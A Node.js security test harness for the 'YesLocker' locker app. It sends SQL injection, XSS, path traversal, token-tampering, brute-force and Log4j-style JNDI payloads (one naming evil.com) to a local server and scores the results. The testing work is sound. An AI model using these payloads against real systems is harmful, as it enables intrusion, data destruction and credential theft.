#!/usr/bin/env node

/**
 * YesLocker Security Boundary Testing Framework
 * 
 * Comprehensive security testing for authentication, authorization,
 * input validation, injection attacks, and security edge cases.
 */

const axios = require('axios');
const crypto = require('crypto');
const fs = require('fs').promises;

class SecurityBoundaryTests {
    constructor() {
        this.baseUrl = 'http://localhost:3001';
        this.results = {
            vulnerabilities: [],
            passed: 0,
            failed: 0,
            critical: 0,
            high: 0,
            medium: 0,
            low: 0
        };
    }

    log(severity, category, test, message, details = null) {
        const timestamp = new Date().toISOString();
        const result = {
            timestamp,
            severity,
            category,
            test,
            message,
            details
        };

        console.log(`[${timestamp}] [${severity}] ${category}/${test}: ${message}`);

        if (severity === 'CRITICAL' || severity === 'HIGH' || severity === 'MEDIUM') {
            this.results.vulnerabilities.push(result);
            this.results[severity.toLowerCase()]++;
            this.results.failed++;
        } else {
            this.results.passed++;
        }
    }

    async createTestToken() {
        try {
            const response = await axios.post(`${this.baseUrl}/admin-login`, {
                phone: '13800000001',
                password: 'admin123'
            });
            return response.data.success ? response.data.token : null;
        } catch (error) {
            return null;
        }
    }

    /**
     * Test SQL Injection vulnerabilities
     */
    async testSQLInjection() {
        console.log('\n=== SQL INJECTION VULNERABILITY TESTS ===');

        const sqlPayloads = [
            // Classic SQL injection payloads
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users--",
            "' UNION SELECT NULL,username,password FROM users--",
            "admin'--",
            "admin' /*",
            "' or 1=1 /*",
            "') or ('1'='1--",
            "') or 1=1--",
            
            // Boolean-based blind SQL injection
            "' AND (SELECT COUNT(*) FROM users) > 0--",
            "' AND SUBSTRING((SELECT password FROM users WHERE phone='13800000001'),1,1)='a'--",
            
            // Time-based blind SQL injection
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR (SELECT COUNT(*) FROM users WHERE phone='13800000001' AND ASCII(SUBSTRING(password,1,1))>65)>0--",
            
            // Union-based SQL injection
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT NULL,version(),NULL--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            
            // Error-based SQL injection
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            
            // Second-order SQL injection
            "test'; INSERT INTO users (phone, name) VALUES ('hacked', 'hacker'); --",
            
            // NoSQL injection attempts (in case of mixed database usage)
            "';return true;var dummy='",
            "'; return db.users.find(); var dummy='",
        ];

        // Test login endpoint
        for (const payload of sqlPayloads) {
            try {
                const response = await axios.post(`${this.baseUrl}/admin-login`, {
                    phone: payload,
                    password: 'admin123'
                });

                if (response.data?.success) {
                    this.log('CRITICAL', 'sql-injection', 'login-bypass', 
                        `SQL injection successful in login`, { payload });
                } else {
                    this.log('PASS', 'sql-injection', 'login-protected', 
                        'Login protected against SQL injection');
                }
            } catch (error) {
                // Check if error reveals database information
                if (error.response?.data && 
                    (error.response.data.toString().includes('mysql') ||
                     error.response.data.toString().includes('postgresql') ||
                     error.response.data.toString().includes('ORA-') ||
                     error.response.data.toString().includes('SQL'))) {
                    this.log('HIGH', 'sql-injection', 'info-disclosure', 
                        'Database error information disclosed', { 
                            payload, 
                            error: error.response.data 
                        });
                } else {
                    this.log('PASS', 'sql-injection', 'error-handled', 
                        'SQL injection error handled safely');
                }
            }
        }

        // Test registration endpoint
        for (const payload of sqlPayloads.slice(0, 10)) { // Test subset to avoid spam
            try {
                const response = await axios.post(`${this.baseUrl}/auth-register`, {
                    phone: payload,
                    name: 'SQL Test User',
                    store_id: 1
                });

                if (response.data?.success) {
                    this.log('HIGH', 'sql-injection', 'registration-bypass', 
                        'SQL injection in registration may have succeeded', { payload });
                } else {
                    this.log('PASS', 'sql-injection', 'registration-protected', 
                        'Registration protected against SQL injection');
                }
            } catch (error) {
                if (error.response?.data && 
                    typeof error.response.data === 'string' &&
                    (error.response.data.includes('mysql') ||
                     error.response.data.includes('postgresql') ||
                     error.response.data.includes('SQL'))) {
                    this.log('MEDIUM', 'sql-injection', 'registration-info-disclosure', 
                        'Database error information disclosed in registration', { payload });
                }
            }
        }
    }

    /**
     * Test Cross-Site Scripting (XSS) vulnerabilities
     */
    async testXSSVulnerabilities() {
        console.log('\n=== XSS VULNERABILITY TESTS ===');

        const xssPayloads = [
            // Basic XSS payloads
            '<script>alert("xss")</script>',
            '<img src="x" onerror="alert(\'xss\')">',
            '<svg onload="alert(\'xss\')">',
            '<iframe src="javascript:alert(\'xss\')"></iframe>',
            '<body onload="alert(\'xss\')">',
            '<div onmouseover="alert(\'xss\')">Hover me</div>',
            
            // Event handler XSS
            'onmouseover="alert(\'xss\')"',
            'onclick="alert(\'xss\')"',
            'onfocus="alert(\'xss\')"',
            
            // JavaScript protocol XSS
            'javascript:alert("xss")',
            'vbscript:alert("xss")',
            'data:text/html,<script>alert("xss")</script>',
            
            // DOM-based XSS
            '"><script>alert("xss")</script>',
            '\';alert("xss");var dummy=\'',
            '</script><script>alert("xss")</script>',
            
            // Filter bypass attempts
            '<SCRIPT>alert("xss")</SCRIPT>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<img src="javascript:alert(\'xss\')">',
            '<img src="" onerror="alert(\'xss\')">',
            
            // Encoded XSS
            '%3Cscript%3Ealert%28%22xss%22%29%3C%2Fscript%3E',
            '&lt;script&gt;alert("xss")&lt;/script&gt;',
            '&#60;script&#62;alert("xss")&#60;/script&#62;',
        ];

        // Test XSS in name field during registration
        for (const payload of xssPayloads) {
            try {
                const response = await axios.post(`${this.baseUrl}/auth-register`, {
                    phone: `138${Date.now().toString().slice(-8)}`,
                    name: payload,
                    store_id: 1
                });

                // If registration succeeds, check if payload is stored as-is
                if (response.data?.success) {
                    this.log('HIGH', 'xss', 'stored-xss-potential', 
                        'XSS payload accepted - potential stored XSS', { payload });
                } else {
                    this.log('PASS', 'xss', 'input-filtered', 
                        'XSS payload rejected or filtered');
                }
            } catch (error) {
                this.log('PASS', 'xss', 'input-validation', 
                    'XSS payload caused validation error (good)');
            }
        }

        // Test reflected XSS in potential error messages
        const reflectedXSSTests = [
            '<script>alert("reflected")</script>',
            '"><script>alert("reflected")</script>',
            '\';alert("reflected");var x=\'',
        ];

        for (const payload of reflectedXSSTests) {
            try {
                const response = await axios.get(`${this.baseUrl}/non-existent-endpoint?param=${encodeURIComponent(payload)}`);
                
                if (response.data && response.data.includes(payload)) {
                    this.log('HIGH', 'xss', 'reflected-xss', 
                        'Reflected XSS vulnerability detected', { payload });
                }
            } catch (error) {
                if (error.response?.data && 
                    typeof error.response.data === 'string' &&
                    error.response.data.includes(payload)) {
                    this.log('HIGH', 'xss', 'reflected-xss-error', 
                        'Reflected XSS in error messages', { payload });
                } else {
                    this.log('PASS', 'xss', 'reflected-protected', 
                        'Protected against reflected XSS');
                }
            }
        }
    }

    /**
     * Test Authentication and Authorization vulnerabilities
     */
    async testAuthenticationBypass() {
        console.log('\n=== AUTHENTICATION BYPASS TESTS ===');

        // Test 1: SQL injection in authentication
        const authBypassPayloads = [
            { phone: "admin' --", password: "" },
            { phone: "admin' /*", password: "*/" },
            { phone: "' OR '1'='1' --", password: "anything" },
            { phone: "' OR 1=1 #", password: "anything" },
            { phone: "admin", password: "' OR '1'='1" },
            { phone: "admin", password: "' OR 1=1 --" },
        ];

        for (const creds of authBypassPayloads) {
            try {
                const response = await axios.post(`${this.baseUrl}/admin-login`, creds);
                
                if (response.data?.success && response.data?.token) {
                    this.log('CRITICAL', 'auth-bypass', 'sql-injection-login', 
                        'Authentication bypass via SQL injection', { credentials: creds });
                } else {
                    this.log('PASS', 'auth-bypass', 'sql-injection-protected', 
                        'Protected against SQL injection authentication bypass');
                }
            } catch (error) {
                this.log('PASS', 'auth-bypass', 'sql-injection-error', 
                    'SQL injection authentication attempt failed');
            }
        }

        // Test 2: Brute force protection
        const bruteForcePromises = [];
        for (let i = 0; i < 20; i++) {
            bruteForcePromises.push(
                axios.post(`${this.baseUrl}/admin-login`, {
                    phone: '13800000001',
                    password: `wrong-password-${i}`
                }).catch(error => ({ error: error.message, status: error.response?.status }))
            );
        }

        try {
            const bruteForceResults = await Promise.all(bruteForcePromises);
            const rateLimited = bruteForceResults.filter(r => 
                r.error && (r.status === 429 || r.error.includes('rate limit'))
            );

            if (rateLimited.length === 0) {
                this.log('MEDIUM', 'auth-bypass', 'no-rate-limiting', 
                    'No rate limiting detected - vulnerable to brute force');
            } else {
                this.log('PASS', 'auth-bypass', 'rate-limiting-active', 
                    'Rate limiting protection detected');
            }
        } catch (error) {
            this.log('MEDIUM', 'auth-bypass', 'brute-force-test-error', 
                'Brute force test failed');
        }

        // Test 3: Password complexity bypass
        const weakPasswords = [
            '', // Empty password
            ' ', // Space password
            '123', // Very short
            'password', // Common password
            '123456', // Sequential
            'admin', // Same as username
        ];

        for (const password of weakPasswords) {
            try {
                const response = await axios.post(`${this.baseUrl}/admin-login`, {
                    phone: '13800000001',
                    password: password
                });

                if (response.data?.success) {
                    this.log('HIGH', 'auth-bypass', 'weak-password', 
                        'Weak password accepted', { password: password });
                } else {
                    this.log('PASS', 'auth-bypass', 'password-validation', 
                        'Weak password rejected');
                }
            } catch (error) {
                this.log('PASS', 'auth-bypass', 'password-validation-error', 
                    'Password validation working');
            }
        }
    }

    /**
     * Test Authorization vulnerabilities
     */
    async testAuthorizationFlaws() {
        console.log('\n=== AUTHORIZATION FLAW TESTS ===');

        const token = await this.createTestToken();
        if (!token) {
            this.log('HIGH', 'authorization', 'token-creation-failed', 
                'Cannot test authorization - token creation failed');
            return;
        }

        // Test 1: Token manipulation
        const manipulatedTokens = [
            token.slice(0, -5) + 'AAAAA', // Modified signature
            token.replace(/[a-zA-Z]/g, 'X'), // Character replacement
            'Bearer ' + token, // Add Bearer prefix
            token + '.extra', // Add extra data
            '', // Empty token
            'null', // Null string
            'undefined', // Undefined string
        ];

        for (const manipulatedToken of manipulatedTokens) {
            try {
                const response = await axios.post(`${this.baseUrl}/admin-approval`, {
                    application_id: 1,
                    action: 'approve',
                    note: 'Authorization test'
                }, {
                    headers: { 'Authorization': `Bearer ${manipulatedToken}` }
                });

                if (response.data?.success) {
                    this.log('CRITICAL', 'authorization', 'token-manipulation', 
                        'Manipulated token accepted', { token: manipulatedToken.substring(0, 20) + '...' });
                } else {
                    this.log('PASS', 'authorization', 'token-validation', 
                        'Manipulated token rejected');
                }
            } catch (error) {
                this.log('PASS', 'authorization', 'token-validation-error', 
                    'Token manipulation caused error (good)');
            }
        }

        // Test 2: Missing authorization header
        try {
            const response = await axios.post(`${this.baseUrl}/admin-approval`, {
                application_id: 1,
                action: 'approve',
                note: 'No auth test'
            });

            if (response.data?.success) {
                this.log('CRITICAL', 'authorization', 'missing-auth', 
                    'Admin action succeeded without authentication');
            } else {
                this.log('PASS', 'authorization', 'auth-required', 
                    'Authentication required for admin actions');
            }
        } catch (error) {
            if (error.response?.status === 401 || error.response?.status === 403) {
                this.log('PASS', 'authorization', 'auth-enforced', 
                    'Authentication properly enforced');
            } else {
                this.log('MEDIUM', 'authorization', 'auth-error', 
                    'Unexpected error for missing authentication');
            }
        }

        // Test 3: Cross-user authorization (IDOR - Insecure Direct Object Reference)
        const idorTests = [
            { user_id: 999999, description: 'Non-existent user' },
            { user_id: -1, description: 'Negative user ID' },
            { user_id: 0, description: 'Zero user ID' },
            { user_id: 'admin', description: 'String user ID' },
            { user_id: '1 OR 1=1', description: 'SQL injection in ID' },
        ];

        for (const test of idorTests) {
            try {
                const response = await axios.post(`${this.baseUrl}/lockers-apply`, {
                    user_id: test.user_id,
                    store_id: 1,
                    months: 1,
                    note: 'IDOR test'
                }, {
                    headers: { 'Authorization': `Bearer ${token}` }
                });

                if (response.data?.success) {
                    this.log('HIGH', 'authorization', 'idor-vulnerability', 
                        'IDOR vulnerability - unauthorized user access', { test });
                } else {
                    this.log('PASS', 'authorization', 'idor-protected', 
                        'IDOR protection working');
                }
            } catch (error) {
                this.log('PASS', 'authorization', 'idor-error', 
                    'IDOR attempt caused error (good)');
            }
        }
    }

    /**
     * Test Input Validation vulnerabilities
     */
    async testInputValidationFlaws() {
        console.log('\n=== INPUT VALIDATION FLAW TESTS ===');

        // Test 1: Buffer overflow attempts
        const bufferOverflowTests = [
            'A'.repeat(1000),
            'A'.repeat(10000),
            'A'.repeat(100000),
        ];

        for (const payload of bufferOverflowTests) {
            try {
                const response = await axios.post(`${this.baseUrl}/auth-register`, {
                    phone: `138${Date.now().toString().slice(-8)}`,
                    name: payload,
                    store_id: 1
                }, { timeout: 10000 });

                if (response.data?.success) {
                    this.log('MEDIUM', 'input-validation', 'buffer-overflow', 
                        'Large input accepted - potential buffer overflow', { size: payload.length });
                } else {
                    this.log('PASS', 'input-validation', 'size-limit', 
                        'Large input rejected');
                }
            } catch (error) {
                if (error.code === 'ECONNABORTED' || error.message.includes('timeout')) {
                    this.log('MEDIUM', 'input-validation', 'dos-potential', 
                        'Large input caused timeout - potential DoS', { size: payload.length });
                } else {
                    this.log('PASS', 'input-validation', 'size-validation', 
                        'Size validation working');
                }
            }
        }

        // Test 2: Format string vulnerabilities
        const formatStringTests = [
            '%s%s%s%s%s%s%s%s%s%s',
            '%x%x%x%x%x%x%x%x%x%x',
            '%n%n%n%n%n%n%n%n%n%n',
            '${jndi:ldap://evil.com/a}', // Log4j style
            '%{${env:USER}}', // Template injection
        ];

        for (const payload of formatStringTests) {
            try {
                const response = await axios.post(`${this.baseUrl}/auth-register`, {
                    phone: `138${Date.now().toString().slice(-8)}`,
                    name: payload,
                    store_id: 1
                });

                if (response.data?.success) {
                    this.log('MEDIUM', 'input-validation', 'format-string', 
                        'Format string payload accepted', { payload });
                } else {
                    this.log('PASS', 'input-validation', 'format-protected', 
                        'Format string payload rejected');
                }
            } catch (error) {
                this.log('PASS', 'input-validation', 'format-validation', 
                    'Format string validation working');
            }
        }

        // Test 3: Path traversal attempts
        const pathTraversalTests = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
        ];

        for (const payload of pathTraversalTests) {
            try {
                const response = await axios.get(`${this.baseUrl}/${payload}`);
                
                if (response.status === 200 && response.data.includes('root:')) {
                    this.log('CRITICAL', 'input-validation', 'path-traversal', 
                        'Path traversal successful - file system access', { payload });
                } else {
                    this.log('PASS', 'input-validation', 'path-protected', 
                        'Path traversal prevented');
                }
            } catch (error) {
                this.log('PASS', 'input-validation', 'path-validation', 
                    'Path traversal validation working');
            }
        }
    }

    /**
     * Test for Information Disclosure vulnerabilities
     */
    async testInformationDisclosure() {
        console.log('\n=== INFORMATION DISCLOSURE TESTS ===');

        // Test 1: Error message information disclosure
        const errorTests = [
            { endpoint: '/non-existent', description: '404 error' },
            { endpoint: '/admin-login', method: 'GET', description: 'Method not allowed' },
            { endpoint: '/admin-login', data: 'invalid json', description: 'Malformed JSON' },
        ];

        for (const test of errorTests) {
            try {
                let response;
                if (test.method === 'GET') {
                    response = await axios.get(`${this.baseUrl}${test.endpoint}`);
                } else if (test.data) {
                    response = await axios.post(`${this.baseUrl}${test.endpoint}`, test.data, {
                        headers: { 'Content-Type': 'application/json' }
                    });
                } else {
                    response = await axios.get(`${this.baseUrl}${test.endpoint}`);
                }
            } catch (error) {
                const errorData = error.response?.data;
                if (errorData && typeof errorData === 'string') {
                    // Check for sensitive information in error messages
                    if (errorData.includes('mysql') || errorData.includes('postgresql') ||
                        errorData.includes('Database') || errorData.includes('SQL') ||
                        errorData.includes('stack trace') || errorData.includes('line ') ||
                        errorData.includes('/usr/') || errorData.includes('C:\\')) {
                        this.log('MEDIUM', 'info-disclosure', 'error-details', 
                            'Sensitive information in error messages', { 
                                test: test.description, 
                                error: errorData.substring(0, 200) 
                            });
                    } else {
                        this.log('PASS', 'info-disclosure', 'safe-errors', 
                            'Error messages safe');
                    }
                }
            }
        }

        // Test 2: HTTP header information disclosure
        try {
            const response = await axios.get(`${this.baseUrl}/health`);
            const headers = response.headers;
            
            // Check for sensitive headers
            const sensitiveHeaders = ['server', 'x-powered-by', 'x-aspnet-version'];
            for (const header of sensitiveHeaders) {
                if (headers[header]) {
                    this.log('LOW', 'info-disclosure', 'header-disclosure', 
                        'Server information disclosed in headers', { 
                            header, 
                            value: headers[header] 
                        });
                }
            }
            
            // Check for missing security headers
            const securityHeaders = ['x-frame-options', 'x-content-type-options', 'x-xss-protection'];
            for (const header of securityHeaders) {
                if (!headers[header]) {
                    this.log('MEDIUM', 'info-disclosure', 'missing-security-header', 
                        'Missing security header', { header });
                }
            }
        } catch (error) {
            this.log('MEDIUM', 'info-disclosure', 'header-test-failed', 
                'Could not test HTTP headers');
        }

        // Test 3: Directory listing
        const directoryTests = [
            '/',
            '/admin/',
            '/config/',
            '/backup/',
            '/logs/',
            '/uploads/',
        ];

        for (const dir of directoryTests) {
            try {
                const response = await axios.get(`${this.baseUrl}${dir}`);
                
                if (response.data && 
                    (response.data.includes('Index of') || 
                     response.data.includes('Directory listing') ||
                     response.data.includes('<pre>'))) {
                    this.log('MEDIUM', 'info-disclosure', 'directory-listing', 
                        'Directory listing enabled', { directory: dir });
                } else {
                    this.log('PASS', 'info-disclosure', 'directory-protected', 
                        'Directory listing disabled');
                }
            } catch (error) {
                this.log('PASS', 'info-disclosure', 'directory-protected', 
                    'Directory access properly restricted');
            }
        }
    }

    /**
     * Generate comprehensive security test report
     */
    async generateReport() {
        const report = {
            summary: {
                total_tests: this.results.passed + this.results.failed,
                passed: this.results.passed,
                failed: this.results.failed,
                vulnerabilities_found: this.results.vulnerabilities.length,
                critical: this.results.critical,
                high: this.results.high,
                medium: this.results.medium,
                low: this.results.low,
                risk_score: this.calculateRiskScore(),
                timestamp: new Date().toISOString()
            },
            vulnerabilities: this.results.vulnerabilities,
            recommendations: this.generateSecurityRecommendations(),
            compliance_status: this.assessCompliance()
        };

        const reportPath = `./security-boundary-test-report-${Date.now()}.json`;
        await fs.writeFile(reportPath, JSON.stringify(report, null, 2));

        console.log('\n' + '='.repeat(80));
        console.log('SECURITY BOUNDARY TEST REPORT');
        console.log('='.repeat(80));
        console.log(`Total Tests: ${report.summary.total_tests}`);
        console.log(`Vulnerabilities Found: ${report.summary.vulnerabilities_found}`);
        console.log(`Critical: ${report.summary.critical}`);
        console.log(`High: ${report.summary.high}`);
        console.log(`Medium: ${report.summary.medium}`);
        console.log(`Low: ${report.summary.low}`);
        console.log(`Risk Score: ${report.summary.risk_score}/100`);
        console.log(`Report saved to: ${reportPath}`);

        if (this.results.vulnerabilities.length > 0) {
            console.log('\nCRITICAL VULNERABILITIES:');
            const criticalVulns = this.results.vulnerabilities.filter(v => v.severity === 'CRITICAL');
            for (const vuln of criticalVulns.slice(0, 5)) {
                console.log(`  ${vuln.category}/${vuln.test}: ${vuln.message}`);
            }
        }

        console.log('\nSECURITY RECOMMENDATIONS:');
        for (const recommendation of report.recommendations.slice(0, 10)) {
            console.log(`  • ${recommendation}`);
        }
        console.log('='.repeat(80));

        return report;
    }

    calculateRiskScore() {
        const criticalWeight = 25;
        const highWeight = 10;
        const mediumWeight = 5;
        const lowWeight = 1;
        
        const score = (this.results.critical * criticalWeight) +
                     (this.results.high * highWeight) +
                     (this.results.medium * mediumWeight) +
                     (this.results.low * lowWeight);
        
        return Math.min(100, score); // Cap at 100
    }

    generateSecurityRecommendations() {
        const recommendations = [];

        if (this.results.critical > 0) {
            recommendations.push('URGENT: Address critical vulnerabilities immediately');
            recommendations.push('Conduct emergency security review');
            recommendations.push('Consider taking system offline until critical issues are fixed');
        }

        if (this.results.vulnerabilities.some(v => v.category === 'sql-injection')) {
            recommendations.push('Implement parameterized queries and input sanitization');
            recommendations.push('Use an ORM with built-in SQL injection protection');
        }

        if (this.results.vulnerabilities.some(v => v.category === 'xss')) {
            recommendations.push('Implement output encoding and Content Security Policy');
            recommendations.push('Sanitize all user inputs before storage and display');
        }

        if (this.results.vulnerabilities.some(v => v.category === 'auth-bypass')) {
            recommendations.push('Strengthen authentication mechanisms');
            recommendations.push('Implement account lockout and rate limiting');
        }

        if (this.results.vulnerabilities.some(v => v.category === 'authorization')) {
            recommendations.push('Implement proper access controls and RBAC');
            recommendations.push('Validate user permissions for all operations');
        }

        recommendations.push('Implement comprehensive security logging');
        recommendations.push('Regular security audits and penetration testing');
        recommendations.push('Security awareness training for development team');
        recommendations.push('Implement Web Application Firewall (WAF)');

        return recommendations;
    }

    assessCompliance() {
        const compliance = {
            owasp_top_10: {
                injection: this.results.vulnerabilities.filter(v => v.category === 'sql-injection').length === 0,
                broken_authentication: this.results.vulnerabilities.filter(v => v.category === 'auth-bypass').length === 0,
                sensitive_data_exposure: this.results.vulnerabilities.filter(v => v.category === 'info-disclosure').length === 0,
                xxe: true, // Not tested
                broken_access_control: this.results.vulnerabilities.filter(v => v.category === 'authorization').length === 0,
                security_misconfiguration: this.results.vulnerabilities.filter(v => v.test.includes('header')).length === 0,
                xss: this.results.vulnerabilities.filter(v => v.category === 'xss').length === 0,
                insecure_deserialization: true, // Not tested
                known_vulnerabilities: true, // Not tested
                insufficient_logging: false, // Assume needs improvement
            }
        };

        const passedChecks = Object.values(compliance.owasp_top_10).filter(Boolean).length;
        compliance.owasp_score = `${passedChecks}/10`;

        return compliance;
    }

    /**
     * Run all security boundary tests
     */
    async runAllTests() {
        console.log('YesLocker Security Boundary Testing Framework');
        console.log('Testing for security vulnerabilities and attack vectors...\n');

        try {
            await this.testSQLInjection();
            await this.testXSSVulnerabilities();
            await this.testAuthenticationBypass();
            await this.testAuthorizationFlaws();
            await this.testInputValidationFlaws();
            await this.testInformationDisclosure();

            const report = await this.generateReport();
            
            // Exit with error code if critical vulnerabilities found
            if (this.results.critical > 0) {
                console.log('\n❌ CRITICAL VULNERABILITIES DETECTED - IMMEDIATE ACTION REQUIRED');
                process.exit(1);
            } else if (this.results.high > 0) {
                console.log('\n⚠️  HIGH RISK VULNERABILITIES DETECTED - URGENT FIXES NEEDED');
                process.exit(1);
            } else if (this.results.medium > 0) {
                console.log('\n⚠️  MEDIUM RISK VULNERABILITIES DETECTED - FIXES RECOMMENDED');
            } else {
                console.log('\n✅ NO CRITICAL SECURITY ISSUES DETECTED');
            }

            return report;
        } catch (error) {
            console.error('Security test framework error:', error);
            throw error;
        }
    }
}

// Run tests if called directly
if (require.main === module) {
    const tests = new SecurityBoundaryTests();
    tests.runAllTests().catch(error => {
        console.error('Fatal error:', error);
        process.exit(1);
    });
}

module.exports = SecurityBoundaryTests;